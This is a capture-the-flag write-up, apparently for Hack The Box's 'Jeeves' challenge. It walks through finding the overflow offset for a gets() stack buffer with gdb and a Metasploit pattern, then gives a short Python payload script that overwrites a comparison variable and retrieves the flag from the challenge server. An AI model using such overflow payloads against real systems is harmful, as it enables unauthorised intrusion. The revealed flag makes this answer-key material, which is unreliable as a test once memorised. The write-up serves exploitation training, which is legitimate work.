# Jeeves Binary Explotation

After download and unzip file lets get first information:

```shell
file jeeves            
jeeves: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18c31354ce48c8d63267a9a807f1799988af27bf, for GNU/Linux 3.2.0, not stripped
```

Check security and debug compiled options:

```shell
gdb -q ./jeeves
Reading symbols from ./jeeves...
(No debugging symbols found in ./jeeves)
gdb-peda$ check
checkpoint  checksec    
gdb-peda$ check
checkpoint  checksec    
gdb-peda$ checksec 
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
gdb-peda$ 
```

Take a look main with ghidra:

![main](IMG/main.jpg)


Lets get ghidra information:


```shell
undefined8 main(void)

{
  char local_48 [44];
  int local_1c;
  void *local_18;
  int local_c;
  
  local_c = -0x21523f2d;
  printf("Hello, good sir!\nMay I have your name? ");
  gets(local_48);
  printf("Hello %s, hope you have a good day!\n",local_48);
  if (local_c == 0x1337bab3) {
    local_18 = malloc(0x100);
    local_1c = open("flag.txt",0);
    read(local_1c,local_18,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
    close(local_1c);
  }
  return 0;
}
```

Objective try to overfflow gets local_48
check disassemble, in this case we want to overflow until main +77, cpm / if sentence:

```shell
gdb-peda$ disassemble 
Dump of assembler code for function main:
   0x00005555555551e9 <+0>:	endbr64 
   0x00005555555551ed <+4>:	push   rbp
   0x00005555555551ee <+5>:	mov    rbp,rsp
   0x00005555555551f1 <+8>:	sub    rsp,0x40
   0x00005555555551f5 <+12>:	mov    DWORD PTR [rbp-0x4],0xdeadc0d3
   0x00005555555551fc <+19>:	lea    rdi,[rip+0xe05]        # 0x555555556008
   0x0000555555555203 <+26>:	mov    eax,0x0
   0x0000555555555208 <+31>:	call   0x5555555550a0 <printf@plt>
   0x000055555555520d <+36>:	lea    rax,[rbp-0x40]
   0x0000555555555211 <+40>:	mov    rdi,rax
   0x0000555555555214 <+43>:	mov    eax,0x0
   0x0000555555555219 <+48>:	call   0x5555555550d0 <gets@plt>
   0x000055555555521e <+53>:	lea    rax,[rbp-0x40]
   0x0000555555555222 <+57>:	mov    rsi,rax
   0x0000555555555225 <+60>:	lea    rdi,[rip+0xe04]        # 0x555555556030
   0x000055555555522c <+67>:	mov    eax,0x0
   0x0000555555555231 <+72>:	call   0x5555555550a0 <printf@plt>
=> 0x0000555555555236 <+77>:	cmp    DWORD PTR [rbp-0x4],0x1337bab3
   0x000055555555523d <+84>:	jne    0x5555555552a8 <main+191>
   0x000055555555523f <+86>:	mov    edi,0x100
   0x0000555555555244 <+91>:	call   0x5555555550e0 <malloc@plt>
   0x0000555555555249 <+96>:	mov    QWORD PTR [rbp-0x10],rax
   0x000055555555524d <+100>:	mov    esi,0x0
   0x0000555555555252 <+105>:	lea    rdi,[rip+0xdfc]        # 0x555555556055
   0x0000555555555259 <+112>:	mov    eax,0x0
   0x000055555555525e <+117>:	call   0x5555555550f0 <open@plt>
   0x0000555555555263 <+122>:	mov    DWORD PTR [rbp-0x14],eax
   0x0000555555555266 <+125>:	mov    rcx,QWORD PTR [rbp-0x10]
   0x000055555555526a <+129>:	mov    eax,DWORD PTR [rbp-0x14]
   0x000055555555526d <+132>:	mov    edx,0x100
   0x0000555555555272 <+137>:	mov    rsi,rcx
   0x0000555555555275 <+140>:	mov    edi,eax
   0x0000555555555277 <+142>:	mov    eax,0x0
   0x000055555555527c <+147>:	call   0x5555555550c0 <read@plt>
   0x0000555555555281 <+152>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000555555555285 <+156>:	mov    rsi,rax
   0x0000555555555288 <+159>:	lea    rdi,[rip+0xdd1]        # 0x555555556060
   0x000055555555528f <+166>:	mov    eax,0x0
   0x0000555555555294 <+171>:	call   0x5555555550a0 <printf@plt>
   0x0000555555555299 <+176>:	mov    eax,DWORD PTR [rbp-0x14]
   0x000055555555529c <+179>:	mov    edi,eax
   0x000055555555529e <+181>:	mov    eax,0x0
   0x00005555555552a3 <+186>:	call   0x5555555550b0 <close@plt>
   0x00005555555552a8 <+191>:	mov    eax,0x0
   0x00005555555552ad <+196>:	leave  
   0x00005555555552ae <+197>:	ret    
End of assembler dump.
gdb-peda$ 
```


Generate pattern 100 chars patter/n:
```shell
/opt/metasploit/tools/exploit/pattern_create.rb -l 100                                                                                     main 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
Now put a break just on cmp address:

```shell
gdb ./jeeves 
GNU gdb (GDB) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./jeeves...
(No debugging symbols found in ./jeeves)
gdb-peda$ break *0x0000555555555236
Breakpoint 1 at 0x555555555236
gdb-peda$ run
Starting program: /home/darthv/git/badorius/vulnhub/hackthebox/Jeeves/Files/jeeves 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Hello, good sir!
May I have your name? Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
[----------------------------------registers-----------------------------------]
RAX: 0x86 
RBX: 0x7fffffffe788 --> 0x7fffffffea55 ("/home/darthv/git/badorius/vulnhub/hackthebox/Jeeves/Files/jeeves")
RCX: 0x0 
RDX: 0x0 
RSI: 0x5555555592a0 ("Hello Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A, hope you have a good day!\n")
RDI: 0x7fffffffe0d0 --> 0x7ffff7dfb160 (<funlockfile>:	endbr64)
RBP: 0x7fffffffe670 ("c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
RSP: 0x7fffffffe630 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
RIP: 0x555555555236 (<main+77>:	cmp    DWORD PTR [rbp-0x4],0x1337bab3)
R8 : 0x555555559715 --> 0x0 
R9 : 0x73 ('s')
R10: 0x0 
R11: 0x202 
R12: 0x0 
R13: 0x7fffffffe798 --> 0x7fffffffea96 ("SHELL=/bin/bash")
R14: 0x0 
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x555555554000 --> 0x10102464c457f
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555555225 <main+60>:	lea    rdi,[rip+0xe04]        # 0x555555556030
   0x55555555522c <main+67>:	mov    eax,0x0
   0x555555555231 <main+72>:	call   0x5555555550a0 <printf@plt>
=> 0x555555555236 <main+77>:	cmp    DWORD PTR [rbp-0x4],0x1337bab3
   0x55555555523d <main+84>:	jne    0x5555555552a8 <main+191>
   0x55555555523f <main+86>:	mov    edi,0x100
   0x555555555244 <main+91>:	call   0x5555555550e0 <malloc@plt>
   0x555555555249 <main+96>:	mov    QWORD PTR [rbp-0x10],rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe630 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0008| 0x7fffffffe638 ("2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0016| 0x7fffffffe640 ("a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0024| 0x7fffffffe648 ("Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0032| 0x7fffffffe650 ("0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0040| 0x7fffffffe658 ("b3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0048| 0x7fffffffe660 ("Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0056| 0x7fffffffe668 ("8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555555236 in main ()
gdb-peda$ 
```

Now we need to know string content from $rbp-0x4 (value we want to modify on cmp) with examine in format string x/s

```shell
gdb-peda$  x/s $rbp-0x4
0x7fffffffe66c:	"Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
gdb-peda$ 
```

We need to subtract "Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" string from original one "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
Now we know that if we overflow gets with "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9" string we will be just on rbp-0x4 from cmp, so in order to pass the if (cmp) we try to put 0x1337bab3 (\xb3\xba\x37\x13)as value on it just after overflow.
Let's python do magic: 

Create exploit.py, take a look on eof var, need only on server side (nc)

```python
offset = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9"
jumpto = b"\xb3\xba\x37\x13"
eof = b"\n"
exploit = offset + jumpto + eof
f = open("exploit.bin", "wb")
f.write(exploit)
f.close()
print(exploit)

```

Execute exploit:

```shell
python exploit.py                                                                                                                          main 
b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9\xb3\xba7\x13'
cat exploit.bin | ./jeeves 
Hello, good sir!
May I have your name? Hello Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9��7, hope you have a good day!
Pleased to make your acquaintance. Here's a small gift: {GET THE FLAG MY FRIEND}
```

Lets try to server side:

```shell
nc 139.59.167.169 32197 < exploit.bin
Hello, good sir!
May I have your name? Hello Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9��7, hope you have a good day!
Pleased to make your acquaintance. Here's a small gift: HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}
```
